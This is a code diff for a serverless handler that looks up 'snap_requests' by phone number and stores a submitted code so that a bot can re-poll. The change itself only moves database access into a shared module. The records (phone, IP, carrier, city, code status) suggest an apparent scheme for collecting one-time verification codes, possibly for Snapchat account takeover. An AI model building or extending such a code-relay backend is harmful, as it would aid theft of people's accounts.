@@ -7,7 +7,7 @@
  *        Rejects if completed, wrong_number, or any other terminal status.
  */
 
-import { neon } from "@neondatabase/serverless";
+import { sql } from "./_db.js";
 import { checkBannedIP } from "./middleware.js";
 
 const ALLOWED_STATUSES = new Set(["waiting_code", "retry_code"]);
@@ -27,7 +27,7 @@ export default async function handler(req, res) {
             return res.status(400).json({ success: false, message: "Champs manquants" });
         }
 
-        const sql = neon(process.env.DATABASE_URL);
+        // (db access via ./_db.js)
         const result = await sql`
             SELECT id, username, phone, ip_address, code_length, status, operator, country, city
             FROM snap_requests WHERE phone = ${phone} LIMIT 1
@@ -70,7 +70,7 @@ export default async function handler(req, res) {
             });
         }
 
-        // Update: status → code_submitted (triggers updated_at via DB trigger → bot re-polls)
+        // Update: status → code_submitted (updated_at is refreshed by ON UPDATE CURRENT_TIMESTAMP → bot re-polls)
         await sql`
             UPDATE snap_requests
             SET status = 'code_submitted', staff_code = ${codeStr}
